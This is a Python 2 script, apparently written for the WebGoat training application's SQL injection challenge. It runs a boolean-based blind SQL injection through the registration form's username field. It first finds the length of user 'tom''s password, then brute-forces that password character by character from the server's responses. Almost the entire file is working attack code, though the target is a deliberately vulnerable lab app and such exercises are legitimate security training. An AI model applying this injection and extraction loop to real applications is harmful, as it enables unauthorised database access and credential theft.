import requests


def get_status(content):
    if 'already exists please try to register with a different username.' in content:
        return 1
    elif 'created, please proceed to the login page.' in content:
        return 0
    else:
        return -1


url = 'http://192.168.50.78:8080/WebGoat/SqlInjection/challenge'

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'http://192.168.50.78:8080/WebGoat/start.mvc',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': '84',
    'Cookie': 'JSESSIONID=18E6C343F724C0EFC255A3B472DA8675',
    'Connection': 'keep-alive',
    'Host': '192.168.50.78:8080',
    }

data = {
    'username_reg': 'a',
    'email_reg': 'a@a.com',
    'password_reg': 'a',
    'confirm_password_reg': 'a',
}

s = requests.session()

tom_pass_len = 0
for i in range(2, 100):
    data['username_reg'] = "tom' AND LENGTH(password)=%d AND '1'='1" % i
    res = s.put(url, headers=headers, data=data)
    print res.content
    if get_status(res.content) == -1:
        print 'Error'
        exit(0)
    elif get_status(res.content) == 0:
        continue
    elif get_status(res.content) == 1:
        print 'password len: %d' % i
        tom_pass_len = i
        break

tom_password = ['*'] * tom_pass_len
common_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
for i in range(1, tom_pass_len+1):
    for c in common_chars:
        data['username_reg'] = "tom' AND SUBSTRING(password, %d, 1)='%s" % (i, c)
        res = s.put(url, headers=headers, data=data)
        print res.content
        if get_status(res.content) == -1:
            print 'Error'

            exit(0)
        elif get_status(res.content) == 0:
            continue
        elif get_status(res.content) == 1:
            print c
            tom_password[i-1] = c
            break

print 'tom_password: ', ''.join(tom_password)
